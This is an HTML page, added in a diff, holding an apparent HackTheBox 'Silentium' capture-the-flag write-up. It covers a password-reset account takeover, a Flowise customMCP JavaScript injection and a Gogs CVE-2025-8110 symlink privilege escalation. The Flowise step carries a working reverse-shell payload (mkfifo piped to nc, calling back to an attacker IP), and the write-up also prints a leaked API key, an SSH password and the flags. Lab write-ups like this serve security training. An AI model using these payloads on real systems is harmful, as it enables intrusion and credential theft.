@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="color-scheme" content="light dark">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="4.5.3.831830741248">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 4.5.3">
+
+    <!-- Primary Meta Tags -->
+    <title>Silentium</title>
+    <meta name="title" content="Silentium">
+    <meta name="description" content="Platform: HackTheBox · OS: Linux · Difficulty: Hard · Status: Retired">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://docs.example.com/4-writeups/silentium/">
+    <link rel="sitemap" type="application/xml" title="Sitemap" href="https://docs.example.com/sitemap.xml">
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://docs.example.com/4-writeups/silentium/">
+    <meta property="og:title" content="Silentium">
+    <meta property="og:description" content="Platform: HackTheBox · OS: Linux · Difficulty: Hard · Status: Retired">
+    <meta property="og:site_name" content="Portfolio">
+    <meta property="og:locale" content="en_US">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://docs.example.com/4-writeups/silentium/">
+    <meta name="twitter:title" content="Silentium">
+    <meta name="twitter:description" content="Platform: HackTheBox · OS: Linux · Difficulty: Hard · Status: Retired">
+
+    <!-- Alternate Markdown -->
+    <link rel="alternate" type="text/markdown" href="https://docs.example.com/4-writeups/silentium.md">
+
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
+
+    <link href="../../resources/css/retype.css?v=4.5.3.831830741248" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../resources/js/config.js?v=4.5.3.831830741248" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/retype.js?v=4.5.3" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=4.5.3.831830741248" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=4.5.3.831830741248" defer></script>
+</head>
+<body>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+    <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
+
+    <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
+        <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+            <!-- Mobile menu button skeleton -->
+            <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-hidden rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+            <div v-cloak id="retype-sidebar-left-toggle-button"></div>
+    
+            <!-- Logo -->
+            <div class="flex items-center justify-between h-full py-2 md:w-75">
+                <div class="flex items-center px-2 md:px-6">
+                    <a id="retype-branding-logo" href="https://docs.example.com/" class="flex items-center leading-snug text-2xl">
+                        <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">Portfolio</span>
+                    </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Docs</span>
+                </div>
+    
+                <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
+            </div>
+    
+            <div class="flex justify-between md:grow">
+                <!-- Top Nav -->
+                <nav id="retype-header-nav" class="hidden md:flex">
+                    <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                        <li class="mr-6">
+                            <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text hover:text-header-text-hover" href="https://retype.com/guides/getting-started/">Getting Started</a>
+                        </li>
+    
+                    </ul>
+                </nav>
+    
+                <div v-cloak class="flex justify-end grow">
+                    <div id="retype-mobile-search-button"></div>
+                    <doc-search-desktop></doc-search-desktop>
+    
+                    <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                    <doc-history></doc-history>
+                </div>
+            </div>
+        </div>
+    </header>
+
+
+    <div id="retype-container" class="container relative flex bg-white">
+        <!-- Sidebar Skeleton -->
+        <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
+        
+            <div class="flex items-center h-16 px-6">
+                <input id="retype-filter-input-mock" class="w-full h-10 pl-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded-lg shadow-none md:text-sm hover:border-filter-border-hover focus:outline-hidden focus:border-filter-border-focus placeholder-filter-placeholder" type="text">
+            </div>
+        
+            <div class="pl-6 mt-1 mb-4">
+                <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+            </div>
+        
+            <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                    <span class="text-xs whitespace-nowrap">Powered by</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                </a>
+            </div>
+        </div>
+        
+        <!-- Sidebar component -->
+        <doc-sidebar v-cloak>
+            <template #sidebar-footer>
+                <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
+        
+                    <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
+                        <nav>
+                            <ul class="flex flex-wrap justify-center items-center">
+                                <li class="mr-6">
+                                    <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text hover:text-header-text-hover" href="https://retype.com/guides/getting-started/">Getting Started</a>
+                                </li>
+        
+                            </ul>
+                        </nav>
+                    </div>
+        
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </template>
+        </doc-sidebar>
+
+        <div class="grow min-w-0 bg-body-bg">
+            <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+<div class="flex">
+    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
+        <main class="relative pb-12 lg:pt-2">
+            <div class="relative retype-markdown" id="retype-content">
+                <!-- Rendered if sidebar right is enabled -->
+                <div id="retype-sidebar-right-toggle"></div>
+                <doc-page-actions></doc-page-actions>
+
+                <!-- Page content  -->
+<h1 id="silentium">Silentium</h1>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-secondary"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="block text-callout-secondary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+            <h5>Machine Info</h5>
+<p><strong>Platform:</strong> HackTheBox · <strong>OS:</strong> Linux · <strong>Difficulty:</strong> Hard · <strong>Status:</strong> Retired</p>
+        </div>
+    </div>
+</div>
+<hr>
+<h2 id="-reconnaissance"><span class="docs-emoji">&#x1F50D;</span> Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Initial scan reveals two open ports:</p>
+<div id="nmap-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">22/tcp  open  ssh
+80/tcp  open  http</code></pre>
+</doc-codeblock></div>
+<h3 id="virtual-host-enumeration">Virtual Host Enumeration</h3>
+<p>Adding <code translate="no" v-pre>silentium.htb</code> to <code translate="no" v-pre>/etc/hosts</code> gives access to the main web application — a page listing employee names, including <strong>ben</strong>.</p>
+<p>Running <code translate="no" v-pre>subfinder</code> uncovers a second subdomain:</p>
+<div id="virtual-host-enumeration-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">staging.silentium.htb</code></pre>
+</doc-codeblock></div>
+<p>Add it to <code translate="no" v-pre>/etc/hosts</code> as well. This subdomain hosts a <strong>login page</strong>.</p>
+<hr>
+<h2 id="-web--foothold-via-flowise-rce"><span class="docs-emoji">&#x1F310;</span> Web — Foothold via Flowise RCE</h2>
+<h3 id="password-reset-enumeration">Password Reset Enumeration</h3>
+<p>The password reset endpoint leaks whether a username exists. Testing with <code translate="no" v-pre>ben@silentium.htb</code> confirms the account:</p>
+<div id="password-reset-enumeration-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H &quot;Content-Type: application/json&quot; \
+  -d '{&quot;user&quot;:{&quot;email&quot;:&quot;ben@silentium.htb&quot;}}'</code></pre>
+</doc-codeblock></div>
+<p>The response includes a <strong><code translate="no" v-pre>tempToken</code></strong>.</p>
+<h3 id="password-reset">Password Reset</h3>
+<p>Use the token to set a new password:</p>
+<div id="password-reset-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+  -H &quot;Content-Type: application/json&quot; \
+  -d '{
+    &quot;user&quot;: {
+      &quot;email&quot;: &quot;ben@silentium.htb&quot;,
+      &quot;tempToken&quot;: &quot;&lt;TOKEN_HERE&gt;&quot;,
+      &quot;password&quot;: &quot;MyPassword123&quot;
+    }
+  }'</code></pre>
+</doc-codeblock></div>
+<h3 id="api-key-recovery">API Key Recovery</h3>
+<p>Authenticate on the staging platform and navigate the UI menus to retrieve ben&#x27;s <strong>API key</strong>:</p>
+<div id="api-key-recovery-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">n3vQgeiafsz7jNi24HreclgpAWqIRTYZhizvAVUQwjY</code></pre>
+</doc-codeblock></div>
+<h3 id="flowise-rce">Flowise RCE</h3>
+<p>The platform is running <strong>Flowise</strong>. The <code translate="no" v-pre>customMCP</code> endpoint is vulnerable to remote code execution via a JavaScript injection in the <code translate="no" v-pre>mcpServerConfig</code> parameter.</p>
+<p>Set up a listener:</p>
+<div id="flowise-rce-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">nc -lvp 4444</code></pre>
+</doc-codeblock></div>
+<p>Trigger the reverse shell:</p>
+<div id="flowise-rce-code-2" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+  -H &quot;Content-Type: application/json&quot; \
+  -H &quot;Authorization: Bearer n3vQgeiafsz7jNi24HreclgpAWqIRTYZhizvAVUQwjY&quot; \
+  -d '{
+    &quot;loadMethod&quot;: &quot;listActions&quot;,
+    &quot;inputs&quot;: {
+      &quot;mcpServerConfig&quot;: &quot;({x:(function(){const cp=process.mainModule.require(\&quot;child_process\&quot;);cp.exec(\&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.6 4444 &gt;/tmp/f\&quot;);return 1;})()} )&quot;
+    }
+  }'</code></pre>
+</doc-codeblock></div>
+<p>Shell received.</p>
+<hr>
+<h2 id="-user-flag"><span class="docs-emoji">&#x1F41A;</span> User Flag</h2>
+<p>Enumerate environment variables after getting the shell:</p>
+<div id="-user-flag-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">env</code></pre>
+</doc-codeblock></div>
+<p>Credentials found: <code translate="no" v-pre>r04D!!_R4ge</code> — ben&#x27;s SSH password.</p>
+<div id="-user-flag-code-2" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">ssh ben@10.129.31.50</code></pre>
+</doc-codeblock></div>
+<p><strong>User flag:</strong> <code translate="no" v-pre>1ad3e56ca64c3dc7542fb54e9f397cf5</code></p>
+<hr>
+<h2 id="-privilege-escalation--cve-2025-8110-gogs-symlink-attack"><span class="docs-emoji">&#x2B06;&#xFE0F;</span> Privilege Escalation — CVE-2025-8110 (Gogs Symlink Attack)</h2>
+<h3 id="internal-service-discovery">Internal Service Discovery</h3>
+<p>Checking locally bound ports:</p>
+<div id="internal-service-discovery-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">ss -tlnp</code></pre>
+</doc-codeblock></div>
+<p><strong>Gogs</strong> is running on <code translate="no" v-pre>127.0.0.1:3001</code>.</p>
+<h3 id="port-forwarding">Port Forwarding</h3>
+<div id="port-forwarding-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">ssh -L 3001:127.0.0.1:3001 ben@10.129.31.50</code></pre>
+</doc-codeblock></div>
+<p>Access Gogs at <code translate="no" v-pre>http://localhost:3001</code>.</p>
+<h3 id="account-creation">Account Creation</h3>
+<p>Register a test account at <code translate="no" v-pre>http://localhost:3001/user/sign_up</code>:</p>
+<div id="account-creation-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Username: test
+Password: test123</code></pre>
+</doc-codeblock></div>
+<h3 id="exploiting-cve-2025-8110">Exploiting CVE-2025-8110</h3>
+<p>The vulnerability is a <strong>symlink attack</strong> via the Gogs repository contents API — it allows reading arbitrary files as the user running Gogs (root in this case).</p>
+<p>Use the PoC: <a href="https://github.com/zAbuQasem/gogs-CVE-2025-8110/blob/main/CVE-2025-8110.py">zAbuQasem/gogs-CVE-2025-8110</a></p>
+<p>Before running, patch the script:</p>
+<ul>
+<li><strong>Remove line 213</strong></li>
+<li><strong>Update lines 209–210</strong> with your credentials (<code translate="no" v-pre>test</code> / <code translate="no" v-pre>test123</code>)
+Set up a listener:</li>
+</ul>
+<div id="exploiting-cve-2025-8110-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">nc -lvp 5555</code></pre>
+</doc-codeblock></div>
+<p>Run the exploit:</p>
+<div id="exploiting-cve-2025-8110-code-2" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">python gogs1.py -u http://localhost:3001 -lh 10.10.16.6 -lp 5555</code></pre>
+</doc-codeblock></div>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-warning"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="block text-callout-warning" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M22.48 15.59L14.01 1.45A2.968 2.968 0 0012.16.09c-.78-.19-1.58-.07-2.27.35-.41.25-.76.6-1.01 1.01v.01L.4 15.6c-.83 1.43-.33 3.27 1.1 4.1.45.26.95.4 1.48.4h16.95c.8-.01 1.55-.33 2.11-.9.56-.57.87-1.33.86-2.13a3.04 3.04 0 00-.42-1.48zm-1.87 2.21c-.19.19-.44.3-.69.3H2.99c-.17 0-.34-.05-.49-.13a.992.992 0 01-.37-1.35L10.6 2.48c.08-.14.2-.25.34-.33a.992.992 0 011.37.33l8.46 14.13c.09.15.13.32.13.49 0 .26-.1.51-.29.7z"></path>
+                    <path d="M11.45 12.1c.55 0 1-.45 1-1v-4c0-.55-.45-1-1-1s-1 .45-1 1v4c0 .56.45 1 1 1zM11.46 14.1c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+            <h5>Git identity error</h5>
+<p>If the script fails with a git identity error, run:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">git config --global user.email &quot;test@test.com&quot;
+git config --global user.name &quot;test&quot;</code></pre>
+</doc-codeblock></div>
+<p>Then re-run the exploit.</p>
+        </div>
+    </div>
+</div>
+<p>Root shell received on the listener.</p>
+<p><strong>Root flag:</strong> <code translate="no" v-pre>97fd69078ed8b6daf992cecd42e40bac</code></p>
+<hr>
+<h2 id="-key-takeaways"><span class="docs-emoji">&#x1F4CC;</span> Key Takeaways</h2>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Phase</th>
+<th>Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Recon</td>
+<td>Subdomain enumeration via <code translate="no" v-pre>subfinder</code></td>
+</tr>
+<tr>
+<td>Initial access</td>
+<td>Password reset token leak → account takeover</td>
+</tr>
+<tr>
+<td>Foothold</td>
+<td>Flowise RCE via <code translate="no" v-pre>customMCP</code> JavaScript injection</td>
+</tr>
+<tr>
+<td>Lateral movement</td>
+<td>Credentials in environment variables</td>
+</tr>
+<tr>
+<td>Privesc</td>
+<td>CVE-2025-8110 — Gogs symlink attack via contents API</td>
+</tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="-references"><span class="docs-emoji">&#x1F517;</span> References</h2>
+<ul>
+<li><a href="https://github.com/zAbuQasem/gogs-CVE-2025-8110">CVE-2025-8110 PoC — zAbuQasem</a></li>
+<li><a href="https://docs.flowiseai.com">Flowise documentation</a></li>
+</ul>
+
+                
+                <!-- Required only on API pages -->
+                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+            </div>
+            <footer id="retype-content-footer" class="clear-both">
+            
+                <nav id="retype-nextprev" class="print:hidden flex mt-14">
+                    <div class="w-1/2">
+                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../4-writeups/">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                            <span>
+                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
+                                <span class="block mt-1">&#128221; Writeups</span>
+                            </span>
+                        </a>
+                    </div>
+            
+                    <div class="w-1/2">
+                    </div>
+                </nav>
+            </footer>
+        </main>
+
+        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                <div id="retype-footer-links" class="print:hidden">
+                    <ul class="flex flex-wrap items-center text-sm">
+                    </ul>
+                </div>
+                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link text-sm leading-relaxed"><p>© Copyright 2026. All rights reserved.</p></div>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Rendered if sidebar right is enabled -->
+    <!-- Sidebar right skeleton-->
+    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:translate-x-0 sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
+        <div class="pl-5">
+            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+        </div>
+    </div>
+
+    <!-- User should be able to hide sidebar right -->
+    <doc-sidebar-right v-cloak></doc-sidebar-right>
+</div>
+
+        </div>
+    </div>
+
+    <doc-search-mobile></doc-search-mobile>
+    <doc-back-to-top></doc-back-to-top>
+</div>
+
+
+    <div id="retype-overlay-target"></div>
+
+        <script data-cfasync="false">window.__DOCS__ = { "title": "Silentium", level: 2, icon: "file", hasPrism: true, hasInstagram: false, hasMermaid: false, hasMath: false, tocDepth: 23, "md": "/4-writeups/silentium.md" }</script>
+</body>
+</html>
